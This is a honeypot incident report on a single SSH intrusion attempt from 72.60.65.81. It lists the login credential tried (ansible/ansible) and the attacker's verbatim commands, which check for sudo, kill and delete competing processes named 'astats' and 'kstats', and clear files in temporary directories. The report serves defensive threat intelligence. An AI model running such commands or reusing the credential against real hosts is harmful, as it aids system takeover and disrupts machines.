# Incident: 72.60.65.81

| | |
|---|---|
| Source | `72.60.65.81` |
| Country | United States of America |
| First seen | 2026-09-15 17:55:01 UTC |
| Last seen | 2026-09-15 17:55:04 UTC |
| Sessions | 1 |
| Events | 8 |
| Services abused | ssh |
| Ports | 22 |

## Techniques

- `CWE-78` OS command injection

## Credentials attempted

1 attempts across 1 distinct pairs.

| username | password | count |
|---|---|---|
| `ansible` | `ansible` | 1 |

## Commands executed

Verbatim attacker input. Lyrebird's responses are deliberately not published.

```
sudo -n true
sudo sh -c "pids=$(pgrep -af 'astats' \| grep -vE 'ssh\|sshd\|bash\|sh\|pkill\|pgrep' \| awk '{print $1}'); [ -n \"$pids\" ] && kill -9 $pids \|\| pkill -x 'astats' \|\| true"
sudo sh -c "pids=$(pgrep -af 'kstats' \| grep -vE 'ssh\|sshd\|bash\|sh\|pkill\|pgrep' \| awk '{print $1}'); [ -n \"$pids\" ] && kill -9 $pids \|\| pkill -x 'kstats' \|\| true"
sudo sh -c "cd /dev/shm \|\| cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; find . -type f -name 'astats' -delete ; find . -type f -name 's.lock' -delete ; find . -type f -n…
```

---

Collected by a Lyrebird honeypot operated by [birdo.uk](https://birdo.uk). Generated 2026-09-15 18:03 UTC.

Services are emulated; no real host was compromised. Attacker input is reproduced verbatim and is hostile by definition — do not execute anything recorded here.
